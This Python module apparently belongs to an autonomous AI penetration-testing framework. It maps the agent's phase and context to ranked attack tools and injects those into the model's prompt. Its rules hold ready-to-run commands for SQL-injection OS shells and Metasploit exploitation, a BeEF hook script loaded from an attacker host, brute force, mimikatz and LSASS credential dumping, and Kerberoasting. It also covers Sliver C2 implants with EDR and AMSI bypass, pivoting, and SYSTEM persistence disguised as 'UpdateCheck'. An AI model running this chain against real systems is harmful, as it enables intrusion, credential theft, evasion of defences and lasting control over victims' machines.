"""kali-executor/open-interpreter/tool_recommender.py

Sprint 1+: Smart Tool Recommender (3-layer funnel).

Context-aware tool selection that narrows 133+ tools to 3-5 recommendations.
Analyzes: current phase, target OS, discovered services, found vulns,
previously used tools, and tool outcomes to recommend the BEST next tool.

Layer 1: Phase Gate        (tool_phase_map.py)    -- ~30-40 tools allowed
Layer 2: Context Recommender (this module)        -- top 3-5 for THIS situation
Layer 3: Comfort Zone Breaker (tool_usage_tracker) -- demote overused tools
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger(__name__)


# ── Enums ─────────────────────────────────────────────────────

class TargetOS(str, Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    UNKNOWN = "unknown"


class ServiceType(str, Enum):
    HTTP = "http"
    HTTPS = "https"
    SSH = "ssh"
    SMB = "smb"
    RDP = "rdp"
    FTP = "ftp"
    SMTP = "smtp"
    DNS = "dns"
    MSSQL = "mssql"
    MYSQL = "mysql"
    POSTGRES = "postgres"
    LDAP = "ldap"
    WINRM = "winrm"
    SNMP = "snmp"
    TELNET = "telnet"
    VNC = "vnc"


class VulnType(str, Enum):
    XSS = "xss"
    SQLI = "sqli"
    RCE = "rce"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    IDOR = "idor"
    AUTH_BYPASS = "auth_bypass"
    WEAK_CREDS = "weak_creds"
    DEFAULT_CREDS = "default_creds"
    MISCONFIG = "misconfig"
    CVE = "cve"
    PRIVESC = "privesc"
    INFO_DISCLOSURE = "info_disclosure"


# ── Data classes ──────────────────────────────────────────────

@dataclass
class AgentContext:
    """Current state of the agent used for tool recommendation."""
    phase: str = "RECON"
    target_os: TargetOS = TargetOS.UNKNOWN
    services_found: List[ServiceType] = field(default_factory=list)
    vulns_found: List[Dict] = field(default_factory=list)
    tools_used: Dict[str, int] = field(default_factory=dict)
    tools_failed: List[str] = field(default_factory=list)
    has_shell: bool = False
    has_creds: bool = False
    has_c2: bool = False
    iteration: int = 0
    target_ip: str = ""
    target_url: str = ""


@dataclass
class ToolRecommendation:
    """A single tool recommendation with context."""
    tool: str
    reason: str
    command_hint: str
    priority: int = 1
    category: str = "general"


# ── Recommendation Rules ─────────────────────────────────────

RECOMMENDATION_RULES: List[Dict] = [
    # === RECON PHASE ===
    {
        "name": "initial_recon_no_services",
        "phase": "RECON",
        "condition": lambda ctx: len(ctx.services_found) == 0,
        "tools": [
            ToolRecommendation("nmap", "No services discovered yet. Start with comprehensive port scan.",
                               "nmap -sV -sC -O -p- {TARGET_IP}", 1, "recon"),
            ToolRecommendation("rustscan", "Fast port discovery, then hand off to nmap for details.",
                               "rustscan -a {TARGET_IP} --ulimit 5000 -- -sV -sC", 2, "recon"),
        ],
    },
    {
        "name": "recon_http_found",
        "phase": "RECON",
        "condition": lambda ctx: ServiceType.HTTP in ctx.services_found or ServiceType.HTTPS in ctx.services_found,
        "tools": [
            ToolRecommendation("ffuf", "Directory/file bruteforce on web service.",
                               "ffuf -u {TARGET_URL}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403", 1, "recon"),
            ToolRecommendation("whatweb", "Fingerprint web technology stack.",
                               "whatweb -v {TARGET_URL}", 2, "recon"),
            ToolRecommendation("nikto", "Web server vulnerability scanner.",
                               "nikto -h {TARGET_URL}", 3, "scanning"),
        ],
    },
    {
        "name": "recon_smb_found",
        "phase": "RECON",
        "condition": lambda ctx: ServiceType.SMB in ctx.services_found,
        "tools": [
            ToolRecommendation("enum4linux", "SMB service found. Enumerate shares, users, groups.",
                               "enum4linux -a {TARGET_IP}", 1, "recon"),
            ToolRecommendation("crackmapexec", "SMB enumeration and spray.",
                               "crackmapexec smb {TARGET_IP} --shares", 2, "recon"),
            ToolRecommendation("smbclient", "Manual SMB share exploration.",
                               "smbclient -L //{TARGET_IP}/ -N", 3, "recon"),
        ],
    },
    {
        "name": "recon_ssh_found",
        "phase": "RECON",
        "condition": lambda ctx: ServiceType.SSH in ctx.services_found,
        "tools": [
            ToolRecommendation("ssh-audit", "SSH found. Audit configuration and algorithms.",
                               "ssh-audit {TARGET_IP}", 1, "recon"),
        ],
    },

    # === VULN DISCOVERY ===
    {
        "name": "vuln_web_deep_scan",
        "phase": "VULN_DISCOVERY",
        "condition": lambda ctx: ServiceType.HTTP in ctx.services_found or ServiceType.HTTPS in ctx.services_found,
        "tools": [
            ToolRecommendation("nuclei", "Run nuclei templates for known CVEs and misconfigs.",
                               "nuclei -u {TARGET_URL} -severity critical,high,medium -o /tmp/nuclei_results.txt", 1, "scanning"),
            ToolRecommendation("sqlmap", "Test form parameters for SQL injection.",
                               "sqlmap -u '{TARGET_URL}?id=1' --batch --level=3 --risk=2", 2, "scanning"),
            ToolRecommendation("wfuzz", "Parameter fuzzing for hidden inputs.",
                               "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 {TARGET_URL}/FUZZ", 3, "scanning"),
        ],
    },
    {
        "name": "vuln_windows_target",
        "phase": "VULN_DISCOVERY",
        "condition": lambda ctx: ctx.target_os == TargetOS.WINDOWS,
        "tools": [
            ToolRecommendation("crackmapexec", "Windows target. Check for common vulns (EternalBlue, Zerologon).",
                               "crackmapexec smb {TARGET_IP} -M zerologon -M petitpotam", 1, "scanning"),
            ToolRecommendation("nmap", "Run Windows-specific NSE scripts.",
                               "nmap --script 'smb-vuln-*' -p 445 {TARGET_IP}", 2, "scanning"),
        ],
    },

    # === EXPLOITATION ===
    {
        "name": "exploit_sqli_found",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: any(v.get("type") == VulnType.SQLI or "sql" in str(v.get("type", "")).lower() for v in ctx.vulns_found),
        "tools": [
            ToolRecommendation("sqlmap", "SQLi confirmed! Exploit for data extraction or OS shell.",
                               "sqlmap -u '{TARGET_URL}' --batch --os-shell --level=5 --risk=3", 1, "exploitation"),
        ],
    },
    {
        "name": "exploit_rce_found",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: any(v.get("type") == VulnType.RCE or "rce" in str(v.get("type", "")).lower() for v in ctx.vulns_found),
        "tools": [
            ToolRecommendation("msfconsole", "RCE confirmed! Use Metasploit to get a proper shell.",
                               "msfconsole -q -x 'search {CVE}; use 0; set RHOSTS {TARGET_IP}; set LHOST {LHOST}; exploit'", 1, "exploitation"),
        ],
    },
    {
        "name": "exploit_xss_found",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: any(v.get("type") == VulnType.XSS or "xss" in str(v.get("type", "")).lower() for v in ctx.vulns_found),
        "tools": [
            ToolRecommendation("beef", "XSS confirmed! Inject BeEF hook for browser takeover.",
                               "# Inject: <script src='http://{LHOST}:3000/hook.js'></script>", 1, "exploitation"),
        ],
    },
    {
        "name": "exploit_weak_creds_windows",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: ctx.has_creds and ctx.target_os == TargetOS.WINDOWS,
        "tools": [
            ToolRecommendation("evil-winrm", "Creds found + Windows. Get interactive shell via WinRM.",
                               "evil-winrm -i {TARGET_IP} -u {USER} -p {PASS}", 1, "exploitation"),
            ToolRecommendation("impacket-psexec", "Creds found + Windows. PsExec for SYSTEM shell.",
                               "impacket-psexec {DOMAIN}/{USER}:{PASS}@{TARGET_IP}", 2, "exploitation"),
            ToolRecommendation("crackmapexec", "Validate creds across multiple services.",
                               "crackmapexec smb {TARGET_IP} -u {USER} -p {PASS} --shares", 3, "exploitation"),
        ],
    },
    {
        "name": "exploit_weak_creds_linux",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: ctx.has_creds and ctx.target_os == TargetOS.LINUX,
        "tools": [
            ToolRecommendation("ssh", "Creds found + Linux. SSH directly.",
                               "ssh {USER}@{TARGET_IP}", 1, "exploitation"),
        ],
    },
    {
        "name": "exploit_no_vulns_try_brute",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: len(ctx.vulns_found) == 0 and not ctx.has_creds,
        "tools": [
            ToolRecommendation("hydra", "No vulns found yet. Try credential brute force.",
                               "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {SERVICE}://{TARGET_IP}", 1, "exploitation"),
            ToolRecommendation("searchsploit", "Search for known exploits for discovered service versions.",
                               "searchsploit {SERVICE} {VERSION}", 2, "exploitation"),
        ],
    },

    # === POST-EXPLOIT ===
    {
        "name": "post_exploit_windows_shell",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_shell and ctx.target_os == TargetOS.WINDOWS,
        "tools": [
            ToolRecommendation("mimikatz", "Dump credentials from Windows memory.",
                               "mimikatz 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'", 1, "post_exploit"),
            ToolRecommendation("winpeas", "Automated Windows privilege escalation enumeration.",
                               "winpeas.exe", 2, "post_exploit"),
            ToolRecommendation("bloodhound", "Map Active Directory attack paths.",
                               "sharphound.exe -c All", 3, "post_exploit"),
        ],
    },
    {
        "name": "post_exploit_linux_shell",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_shell and ctx.target_os == TargetOS.LINUX,
        "tools": [
            ToolRecommendation("linpeas", "Automated Linux privilege escalation enumeration.",
                               "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", 1, "post_exploit"),
        ],
    },
    {
        "name": "post_exploit_need_c2",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_shell and not ctx.has_c2,
        "tools": [
            ToolRecommendation("sliver", "Need persistent C2. Sliver uses mTLS/WireGuard (stealthy).",
                               "sliver-client generate --mtls {LHOST} --os {OS} --save /tmp/implant", 1, "c2"),
            ToolRecommendation("empire", "Need persistent C2. Empire for PowerShell-based ops.",
                               "curl -X POST http://empire:1337/api/v2/listeners -d '{...}'", 2, "c2"),
        ],
    },

    # === C2_DEPLOY — Sliver implant generation & delivery ===
    {
        "name": "c2_deploy_windows",
        "phase": "C2_DEPLOY",
        "condition": lambda ctx: ctx.target_os == TargetOS.WINDOWS,
        "tools": [
            ToolRecommendation("sliver", "Deploy Sliver C2 implant to Windows target via mTLS session.",
                               "python3 /opt/tazosploit/scripts/generate_implant.py --os windows --arch amd64 --transport mtls --mode session --json", 1, "c2"),
            ToolRecommendation("scarecrow", "Wrap Sliver shellcode with ScareCrow for EDR bypass.",
                               "ScareCrow -I /tmp/donut.bin -Loader dll -domain microsoft.com -sign -encryptionmode AES", 2, "evasion"),
            ToolRecommendation("donut", "Convert Sliver implant to position-independent shellcode with AMSI/ETW bypass.",
                               "donut -i /tmp/raw.bin -o /tmp/donut.bin -a 2 -e 3 -z 2 -b 1 -k 1 -j svchost", 3, "evasion"),
        ],
    },
    {
        "name": "c2_deploy_linux",
        "phase": "C2_DEPLOY",
        "condition": lambda ctx: ctx.target_os == TargetOS.LINUX,
        "tools": [
            ToolRecommendation("sliver", "Deploy Sliver C2 implant to Linux target via mTLS session.",
                               "python3 /opt/tazosploit/scripts/generate_implant.py --os linux --arch amd64 --transport mtls --mode session --json", 1, "c2"),
        ],
    },
    {
        "name": "c2_deploy_generic",
        "phase": "C2_DEPLOY",
        "condition": lambda ctx: ctx.target_os == TargetOS.UNKNOWN,
        "tools": [
            ToolRecommendation("sliver", "Deploy Sliver C2 implant (detect OS from prior recon first).",
                               "python3 /opt/tazosploit/scripts/generate_implant.py --os windows --arch amd64 --transport mtls --mode session --json", 1, "c2"),
        ],
    },

    # === POST-EXPLOIT with active C2 — Sliver session operations ===
    {
        "name": "post_exploit_c2_windows_creds",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_c2 and ctx.target_os == TargetOS.WINDOWS,
        "tools": [
            ToolRecommendation("sliver", "Dump credentials via Sliver session (hashdump/BOFs).",
                               "python3 /opt/tazosploit/scripts/c2_post_exploit.py --session-id {SESSION_ID} --action hashdump --output-dir /pentest/output --json", 1, "c2"),
            ToolRecommendation("rubeus", "Kerberoast/AS-REP roast via execute-assembly through Sliver.",
                               "sliver [session] > execute-assembly /opt/tools/Rubeus.exe -- kerberoast /outfile:hashes.txt", 2, "credential_access"),
            ToolRecommendation("nanodump", "Dump LSASS memory stealthily via BOF through Sliver.",
                               "sliver [session] > inline-execute /opt/tools/bofs/nanodump.x64.o --write C:\\Windows\\Temp\\debug.dmp", 3, "credential_access"),
            ToolRecommendation("sharphound", "Collect BloodHound AD data via execute-assembly through Sliver.",
                               "sliver [session] > execute-assembly /opt/tools/SharpHound.exe -- -c All", 4, "discovery"),
        ],
    },
    {
        "name": "post_exploit_c2_linux_creds",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_c2 and ctx.target_os == TargetOS.LINUX,
        "tools": [
            ToolRecommendation("sliver", "Enumerate and extract creds via Sliver session on Linux.",
                               "python3 /opt/tazosploit/scripts/c2_post_exploit.py --session-id {SESSION_ID} --action enum --output-dir /pentest/output --json", 1, "c2"),
            ToolRecommendation("linpeas", "Upload and run LinPEAS for privesc enumeration through Sliver.",
                               "sliver [session] > upload /opt/tools/linpeas.sh /tmp/linpeas.sh && sliver [session] > execute -o 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh -a'", 2, "post_exploit"),
        ],
    },
    {
        "name": "post_exploit_c2_pivot",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_c2,
        "tools": [
            ToolRecommendation("sliver", "Set up SOCKS5 proxy through Sliver session for internal pivoting.",
                               "sliver [session] > socks5 start --port 1080", 1, "pivoting"),
            ToolRecommendation("proxychains", "Route tools through Sliver SOCKS proxy to reach internal network.",
                               "proxychains nmap -sT -Pn -n 10.0.0.0/24 -p 22,80,445,3389 --open", 2, "pivoting"),
        ],
    },
    {
        "name": "post_exploit_c2_privesc_windows",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_c2 and ctx.target_os == TargetOS.WINDOWS and not ctx.has_shell,
        "tools": [
            ToolRecommendation("sliver", "Attempt privilege escalation via getsystem (named pipe impersonation).",
                               "sliver [session] > getsystem", 1, "post_exploit"),
            ToolRecommendation("seatbelt", "Run Seatbelt for comprehensive host enumeration via Sliver.",
                               "sliver [session] > execute-assembly /opt/tools/Seatbelt.exe -- -group=all", 2, "discovery"),
        ],
    },
    {
        "name": "post_exploit_c2_persist",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_c2,
        "tools": [
            ToolRecommendation("sliver", "Install persistence via scheduled task through Sliver session.",
                               "sliver [session] > execute -o 'schtasks /create /tn \"UpdateCheck\" /tr \"C:\\Windows\\Temp\\svc.exe\" /sc onstart /ru SYSTEM /f'", 1, "persistence"),
            ToolRecommendation("sharppersist", "Install persistence via SharpPersist through Sliver.",
                               "sliver [session] > execute-assembly /opt/tools/SharpPersist.exe -- -t schtask -c 'C:\\path\\beacon.exe' -n 'UpdateCheck' -m add", 2, "persistence"),
        ],
    },
]


# ── Public API ────────────────────────────────────────────────

def get_recommendations(
    context: AgentContext,
    max_results: int = 5,
) -> List[ToolRecommendation]:
    """Get tool recommendations based on current agent context.

    Evaluates all rules matching the current phase and context,
    deduplicates by tool name (keep highest priority), and returns
    top N recommendations.
    """
    candidates: List[ToolRecommendation] = []

    for rule in RECOMMENDATION_RULES:
        if rule.get("phase") and rule["phase"] != context.phase:
            continue
        try:
            if rule["condition"](context):
                candidates.extend(rule["tools"])
        except Exception as exc:
            logger.debug("rule_eval_failed rule=%s err=%s", rule.get("name"), exc)

    # Deduplicate by tool name (keep highest priority = lowest number)
    seen: Dict[str, ToolRecommendation] = {}
    for rec in candidates:
        if rec.tool not in seen or rec.priority < seen[rec.tool].priority:
            seen[rec.tool] = rec

    # Filter out tools that have failed
    filtered = [r for r in seen.values() if r.tool not in context.tools_failed]

    # Comfort zone breaker: demote overused tools
    for rec in filtered:
        usage = context.tools_used.get(rec.tool, 0)
        if usage >= 5:
            rec.priority += 10
            rec.reason = f"[OVERUSED {usage}x] {rec.reason}"

    filtered.sort(key=lambda r: r.priority)
    return filtered[:max_results]


def format_recommendations_for_prompt(
    recs: List[ToolRecommendation],
) -> str:
    """Format recommendations for injection into LLM prompt."""
    if not recs:
        return ""

    lines = [
        f"[RECOMMENDED TOOLS -- {len(recs)} options for current situation]",
        "Pick ONE of these tools for your next action. They are ranked by relevance.",
        "Do NOT use tools outside this list unless you have a specific reason.",
        "",
    ]
    for i, rec in enumerate(recs, 1):
        lines.append(f"{i}. {rec.tool.upper()} -- {rec.reason}")
        lines.append(f"   Example: {rec.command_hint}")
        lines.append("")

    return "\n".join(lines)


def build_context_from_agent(agent: Any) -> AgentContext:
    """Build AgentContext from a running DynamicAgent instance.

    Parses agent state to extract OS, services, vulns, etc.
    """
    # Current phase
    phase = "RECON"
    if hasattr(agent, "phase") and hasattr(agent.phase, "current"):
        phase = agent.phase.current.value
    elif hasattr(agent, "phase_current"):
        phase = str(agent.phase_current)

    context = AgentContext(
        phase=phase,
        target_ip=getattr(agent, "target", ""),
        target_url=getattr(agent, "target_url", ""),
        iteration=getattr(agent, "iteration", 0),
    )

    # Detect target OS
    detected_os = getattr(agent, "_detected_os", "")
    if detected_os:
        os_str = str(detected_os).lower()
        if "windows" in os_str:
            context.target_os = TargetOS.WINDOWS
        elif any(x in os_str for x in ("linux", "ubuntu", "debian", "centos")):
            context.target_os = TargetOS.LINUX

    # Check for active sessions/shells
    if hasattr(agent, "_has_active_session"):
        try:
            context.has_shell = agent._has_active_session()
        except Exception:
            pass
    context.has_creds = bool(getattr(agent, "_found_credentials", False))
    context.has_c2 = bool(getattr(agent, "_c2_active", False))

    # Tool usage from tracker
    if hasattr(agent, "tool_tracker"):
        try:
            context.tools_used = dict(agent.tool_tracker.get_usage())
        except Exception:
            pass

    # Extract discovered services from vulns_found
    vulns_found = getattr(agent, "vulns_found", {})
    if isinstance(vulns_found, dict):
        for _vid, v in vulns_found.items():
            if not isinstance(v, dict):
                continue
            vtype = str(v.get("type", "")).lower()
            context.vulns_found.append({"type": vtype, "detail": v.get("title", "")})
            # Infer services from port numbers
            port = v.get("port", 0)
            try:
                port = int(port)
            except (ValueError, TypeError):
                port = 0
            port_service_map = {
                22: ServiceType.SSH, 80: ServiceType.HTTP, 443: ServiceType.HTTPS,
                445: ServiceType.SMB, 3389: ServiceType.RDP, 21: ServiceType.FTP,
                3306: ServiceType.MYSQL, 1433: ServiceType.MSSQL, 5432: ServiceType.POSTGRES,
                389: ServiceType.LDAP, 5985: ServiceType.WINRM, 161: ServiceType.SNMP,
            }
            svc = port_service_map.get(port)
            if svc and svc not in context.services_found:
                context.services_found.append(svc)

    return context
